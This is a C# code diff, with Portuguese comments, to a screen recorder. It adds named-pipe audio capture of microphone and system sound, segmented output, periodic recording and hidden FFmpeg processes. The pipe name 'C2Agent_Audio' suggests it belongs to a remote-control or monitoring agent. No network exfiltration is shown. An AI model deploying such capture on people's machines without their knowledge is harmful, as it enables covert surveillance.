@@ -8,21 +8,25 @@ namespace Agent;
 public class FFmpegRecorder : IDisposable
 {
     private Process? _ffmpegProcess;
+    private AudioManager? _audioManager;
     private bool _isRecording;
     private string? _currentOutputPath;
+    private string? _currentOutputPattern; // Pattern para segmentação (ex: screen_%Y%m%d_%H%M%S.mp4)
     private readonly string _storageBasePath;
     private CancellationTokenSource? _periodicRecordingCts;
     private Task? _periodicRecordingTask;
     private Task? _autoStopTask;
 
     // Configurações padrão
-    public int FPS { get; set; } = 20;
+    public int FPS { get; set; } = 30; // Aumentado de 20 para 30 (melhor qualidade)
     public int VideoBitrate { get; set; } = 2000; // kbps
     public int AudioBitrate { get; set; } = 128; // kbps (não usado diretamente)
     public int VideoQuality { get; set; } = 28; // H.264 CRF (não usado no FFmpeg com preset)
     public bool CaptureAudio { get; set; } = true;
     public double MicrophoneVolume { get; set; } = 0.5; // Não usado (FFmpeg não tem controle direto)
     public double SystemAudioVolume { get; set; } = 0.5; // Não usado (FFmpeg não tem controle direto)
+    public int SegmentSeconds { get; set; } = 30; // Duração de cada segmento (0 = sem segmentação)
+    public string? PreferredMicName { get; set; } = null; // Nome preferido do microfone (matching parcial)
     public int PeriodicIntervalMinutes { get; set; } = 5;
     public int PeriodicDurationMinutes { get; set; } = 2;
 
@@ -47,10 +51,10 @@ public class FFmpegRecorder : IDisposable
     }
 
     /// <summary>
-    /// Inicia gravação de vídeo da tela
+    /// Inicia gravação de vídeo da tela com áudio via NAudio + Named Pipe
     /// </summary>
     /// <param name="durationSeconds">Duração da gravação em segundos (0 = manual stop)</param>
-    /// <returns>Caminho do arquivo de saída</returns>
+    /// <returns>Caminho do arquivo de saída (ou pattern se segmentação ativa)</returns>
     public async Task<string> StartRecording(int durationSeconds = 0)
     {
         if (_isRecording)
@@ -58,60 +62,77 @@ public class FFmpegRecorder : IDisposable
             throw new InvalidOperationException("Gravação já está em andamento");
         }
 
-        // Gerar nome do arquivo com timestamp
-        string timestamp = DateTime.Now.ToString("yyyyMMdd_HHmmss");
-        string fileName = $"screen_{timestamp}.mp4";
-        string dateFolder = Path.Combine(_storageBasePath, "videos", DateTime.Now.ToString("yyyy-MM-dd"));
-
-        // Criar pasta da data se não existir
-        if (!Directory.Exists(dateFolder))
-        {
-            Directory.CreateDirectory(dateFolder);
-        }
-
-        _currentOutputPath = Path.Combine(dateFolder, fileName);
-
         try
         {
-            // Detectar dispositivos de áudio
-            string? micDevice = null;
-            string? stereoMixDevice = null;
+            var sw = System.Diagnostics.Stopwatch.StartNew();
+            Console.WriteLine($"[SYNC] ===== INICIANDO GRAVAÇÃO =====");
+            Console.WriteLine($"[SYNC] T+{sw.ElapsedMilliseconds}ms: Início do StartRecording()");
 
-            if (CaptureAudio)
+            // Criar pasta da data
+            string dateFolder = Path.Combine(_storageBasePath, "videos", DateTime.Now.ToString("yyyy-MM-dd"));
+            if (!Directory.Exists(dateFolder))
             {
-                micDevice = FFmpegHelper.DetectMicrophone();
-                stereoMixDevice = FFmpegHelper.DetectStereoMix();
-
-                if (micDevice == null && stereoMixDevice == null)
-                {
-                    Console.WriteLine("[FFmpegRecorder] ⚠️  Nenhum dispositivo de áudio detectado, gravando só vídeo");
-                }
-                else if (stereoMixDevice == null)
-                {
-                    Console.WriteLine("[FFmpegRecorder] ⚠️  Stereo Mix não detectado, gravando só microfone");
-                }
+                Directory.CreateDirectory(dateFolder);
             }
 
-            // Construir argumentos de comando
-            string arguments = FFmpegHelper.BuildRecordingArguments(
-                _currentOutputPath,
+            // Criar pasta da sessão dentro da pasta da data
+            string sessionFolder = Path.Combine(dateFolder, $"session_{DateTime.Now:HHmm}");
+            if (!Directory.Exists(sessionFolder))
+            {
+                Directory.CreateDirectory(sessionFolder);
+            }
+
+            // Determinar output (arquivo único ou pattern para segmentação)
+            if (SegmentSeconds > 0)
+            {
+                // Segmentação: usar pattern com strftime
+                _currentOutputPattern = Path.Combine(sessionFolder, "screen_%Y%m%d_%H%M%S.mp4");
+                _currentOutputPath = sessionFolder; // Diretório onde segmentos serão salvos
+                Console.WriteLine($"[FFmpegRecorder] Modo segmentação: {SegmentSeconds}s por arquivo");
+                Console.WriteLine($"[FFmpegRecorder] Pattern: {_currentOutputPattern}");
+            }
+            else
+            {
+                // Arquivo único
+                string timestamp = DateTime.Now.ToString("yyyyMMdd_HHmmss");
+                string fileName = $"screen_{timestamp}.mp4";
+                _currentOutputPath = Path.Combine(sessionFolder, fileName);
+                _currentOutputPattern = null;
+                Console.WriteLine($"[FFmpegRecorder] Modo arquivo único: {_currentOutputPath}");
+            }
+
+            // [FASE 1] Iniciar AudioManager (captura áudio via NAudio)
+            if (CaptureAudio)
+            {
+                Console.WriteLine($"[SYNC] T+{sw.ElapsedMilliseconds}ms: Iniciando AudioManager...");
+                _audioManager = new AudioManager(PreferredMicName);
+                await _audioManager.StartAsync();
+                Console.WriteLine($"[SYNC] T+{sw.ElapsedMilliseconds}ms: ✓ AudioManager iniciado (pipe: {_audioManager.FullPipePath})");
+                Console.WriteLine($"[SYNC] ⚠️  ÁUDIO COMEÇOU A CAPTURAR (aguardando FFmpeg conectar...)");
+            }
+
+            // [FASE 2] Construir argumentos FFmpeg com Named Pipe
+            string outputForFFmpeg = SegmentSeconds > 0 ? _currentOutputPattern! : _currentOutputPath!;
+
+            string arguments = FFmpegHelper.BuildRecordingArgumentsWithPipe(
+                outputForFFmpeg,
+                _audioManager?.FullPipePath ?? "\\\\.\\pipe\\C2Agent_Audio",
                 FPS,
-                micDevice,
-                stereoMixDevice,
+                SegmentSeconds,
                 "ultrafast",
                 VideoBitrate
             );
 
-            // Se tem duração limitada, adicionar parâmetro -t
-            if (durationSeconds > 0)
+            // Se duração limitada (e SEM segmentação), adicionar -t
+            if (durationSeconds > 0 && SegmentSeconds == 0)
             {
                 arguments = $"-t {durationSeconds} " + arguments;
             }
 
-            Console.WriteLine($"[FFmpegRecorder] Iniciando gravação: {_currentOutputPath}");
+            Console.WriteLine($"[SYNC] T+{sw.ElapsedMilliseconds}ms: Iniciando processo FFmpeg...");
             Console.WriteLine($"[FFmpegRecorder] Comando: ffmpeg {arguments}");
 
-            // Iniciar processo FFmpeg
+            // [FASE 3] Iniciar processo FFmpeg
             var startInfo = new ProcessStartInfo
             {
                 FileName = FFmpegHelper.GetFFmpegPath(),
@@ -119,7 +140,7 @@ public class FFmpegRecorder : IDisposable
                 UseShellExecute = false,
                 RedirectStandardError = true,
                 RedirectStandardOutput = true,
-                RedirectStandardInput = true,  // Necessário para enviar 'q' ao parar gravação
+                RedirectStandardInput = true,
                 CreateNoWindow = true
             };
 
@@ -131,16 +152,19 @@ public class FFmpegRecorder : IDisposable
             }
 
             _isRecording = true;
+            Console.WriteLine($"[SYNC] T+{sw.ElapsedMilliseconds}ms: ✓ Processo FFmpeg iniciado (PID: {_ffmpegProcess.Id})");
+            Console.WriteLine($"[SYNC] FFmpeg agora vai conectar ao pipe de áudio e iniciar captura de vídeo...");
+            Console.WriteLine($"[SYNC] ===== GRAVAÇÃO EM ANDAMENTO =====");
 
-            // Monitorar stderr do FFmpeg em background (para ver erros)
+            // Monitorar stderr do FFmpeg em background
             _ = Task.Run(() => MonitorFFmpegOutput(_ffmpegProcess));
 
-            // Se duração foi especificada, agendar parada automática
+            // Auto-stop se duração especificada
             if (durationSeconds > 0)
             {
                 _autoStopTask = Task.Run(async () =>
                 {
-                    await Task.Delay((durationSeconds + 2) * 1000); // +2s de margem
+                    await Task.Delay((durationSeconds + 2) * 1000);
                     if (_isRecording && _ffmpegProcess != null && !_ffmpegProcess.HasExited)
                     {
                         await StopRecording();
@@ -148,12 +172,20 @@ public class FFmpegRecorder : IDisposable
                 });
             }
 
-            return _currentOutputPath;
+            return _currentOutputPath!;
         }
         catch (Exception ex)
         {
             Console.WriteLine($"[FFmpegRecorder] Erro ao iniciar gravação: {ex.Message}");
             _isRecording = false;
+
+            // Cleanup em caso de erro
+            if (_audioManager != null)
+            {
+                try { await _audioManager.DisposeAsync(); } catch { }
+                _audioManager = null;
+            }
+
             throw;
         }
     }
@@ -214,6 +246,23 @@ public class FFmpegRecorder : IDisposable
 
             _isRecording = false;
 
+            // Parar AudioManager
+            if (_audioManager != null)
+            {
+                Console.WriteLine("[FFmpegRecorder] Parando AudioManager...");
+                try
+                {
+                    await _audioManager.StopAsync();
+                    await _audioManager.DisposeAsync();
+                    _audioManager = null;
+                    Console.WriteLine("[FFmpegRecorder] ✓ AudioManager parado");
+                }
+                catch (Exception audioEx)
+                {
+                    Console.WriteLine($"[FFmpegRecorder] Erro ao parar AudioManager: {audioEx.Message}");
+                }
+            }
+
             // Aguardar um pouco para garantir que o arquivo foi finalizado
             Console.WriteLine("[FFmpegRecorder] Aguardando finalização do arquivo...");
             await Task.Delay(2000);
@@ -224,17 +273,25 @@ public class FFmpegRecorder : IDisposable
             _ffmpegProcess?.Dispose();
             _ffmpegProcess = null;
 
-            // Verificar se arquivo está acessível
-            Console.WriteLine("[FFmpegRecorder] Verificando acesso ao arquivo...");
-            bool fileAccessible = await WaitForFileAccess(outputPath, maxRetries: 10, delayMs: 500);
-
-            if (fileAccessible)
+            // Com segmentação, não precisa verificar acesso (segmentos já foram finalizados)
+            if (SegmentSeconds > 0)
             {
-                Console.WriteLine($"[FFmpegRecorder] ✓ Gravação parada: {outputPath}");
+                Console.WriteLine($"[FFmpegRecorder] ✓ Gravação parada (segmentos em: {outputPath})");
             }
             else
             {
-                Console.WriteLine($"[FFmpegRecorder] ⚠️  Gravação parada mas arquivo pode estar travado: {outputPath}");
+                // Verificar se arquivo está acessível
+                Console.WriteLine("[FFmpegRecorder] Verificando acesso ao arquivo...");
+                bool fileAccessible = await WaitForFileAccess(outputPath, maxRetries: 10, delayMs: 500);
+
+                if (fileAccessible)
+                {
+                    Console.WriteLine($"[FFmpegRecorder] ✓ Gravação parada: {outputPath}");
+                }
+                else
+                {
+                    Console.WriteLine($"[FFmpegRecorder] ⚠️  Gravação parada mas arquivo pode estar travado: {outputPath}");
+                }
             }
 
             return outputPath;
@@ -465,6 +522,17 @@ public class FFmpegRecorder : IDisposable
         }
 
         _ffmpegProcess?.Dispose();
+
+        // Cleanup AudioManager
+        if (_audioManager != null)
+        {
+            try
+            {
+                _audioManager.DisposeAsync().AsTask().Wait(TimeSpan.FromSeconds(2));
+            }
+            catch { }
+        }
+
         _periodicRecordingCts?.Cancel();
         _periodicRecordingCts?.Dispose();
     }
